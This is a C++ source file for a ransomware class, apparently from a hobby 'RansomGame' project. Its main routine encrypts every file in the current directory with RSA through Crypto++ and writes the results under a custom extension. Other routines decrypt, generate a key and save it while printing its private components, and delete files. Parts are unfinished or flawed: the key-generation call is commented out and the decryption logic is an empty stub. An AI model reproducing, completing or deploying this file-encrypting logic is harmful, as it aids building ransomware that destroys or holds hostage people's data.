#include "Ransom.h"

void Ransom::run_encryption_logic()
{
	/*
	 * 1- Get an encryption key
	 * 2- Get all files
	 * 3- Encrypt files
	 */

	 //this->generate_rsa_private_key();

	const auto path = std::filesystem::current_path();

	for (const auto& entry : std::filesystem::directory_iterator(path))
	{

		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename() == encryption_file_ || entry.path().filename().extension() == custom_extension_name)
		{
			// Do not encrypt the key file, the executable itself, or an already encrypted file
		}
		else
		{
			std::cout << "Encrypting file: " << entry.path().filename() << std::endl;
			const auto& entry_path = entry.path();
			this->encrypt_files((char*) entry_path.c_str());
		}

	}
	
	//this->decrypt_files("my_text.txt.encryptgame");
}

void Ransom::run_decryption_logic()
{
	// if isEncrypted, find all files with the proper custom extension
}

void Ransom::encrypt_files(const char* file_name)
{
	CryptoPP::RSAES_OAEP_SHA_Encryptor e(this->rsaes_oaep_sha_decryptor_->GetPublicKey());
	std::string file_name_string = file_name;
	
	const auto full_dest = const_cast<char*>(file_name_string.append(custom_extension_name).c_str());
	const auto encrypted_file_dest = new CryptoPP::FileSink(full_dest);
	CryptoPP::FileSource(file_name, true, new CryptoPP::PK_EncryptorFilter(rng_, e, encrypted_file_dest));
}

void Ransom::decrypt_files(const char* file_name)
{
	CryptoPP::RSAES_OAEP_SHA_Decryptor d(this->rsaes_oaep_sha_decryptor_->GetPrivateKey());
	

	std::string file_name_string = file_name;
	const auto last_index = file_name_string.find_last_of(".");
	
	if (last_index == std::string::npos) {
		return;
	}
	
	file_name_string = file_name_string.substr(0, last_index);
	const auto full_name = const_cast<char*>(file_name_string.c_str());
	
	const auto decrypted_file_dest = new CryptoPP::FileSink(full_name);
	CryptoPP::FileSource(file_name, true, new CryptoPP::PK_DecryptorFilter(rng_, d, decrypted_file_dest));
}

void Ransom::generate_rsa_private_key()
{
	// Checks if an encryption file already exists, if so, it loads it
	if(std::filesystem::exists(encryption_file_))
	{
		CryptoPP::FileSource rdr(encryption_file_, true);
		this->rsaes_oaep_sha_decryptor_ = new CryptoPP::RSAES_OAEP_SHA_Decryptor(rdr);
	} else
	{
		// Otherwise it creates a new one
		this->rsaes_oaep_sha_decryptor_ = new CryptoPP::RSAES_OAEP_SHA_Decryptor(rng_, 4096);
		CryptoPP::TransparentFilter private_file(new CryptoPP::FileSink(encryption_file_));
		this->rsaes_oaep_sha_decryptor_->GetPrivateKey().Save(private_file);
	}

	std::cout << "Prime key 1: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrime1() << std::endl;
	std::cout << "\nPrime key 2: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrime2() << std::endl;
	std::cout << "\nPrivate exp: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetPrivateExponent() << std::endl;
	std::cout << "\nModulus: " << this->rsaes_oaep_sha_decryptor_->GetKey().GetModulus() << std::endl;
}

void Ransom::delete_file(const char* file)
{
	if (remove(file) != 0)
	{
		std::cout << "Error deleting file" << std::endl;
	} else
	{
		std::cout << "File successfully deleted" << std::endl;
	}
}
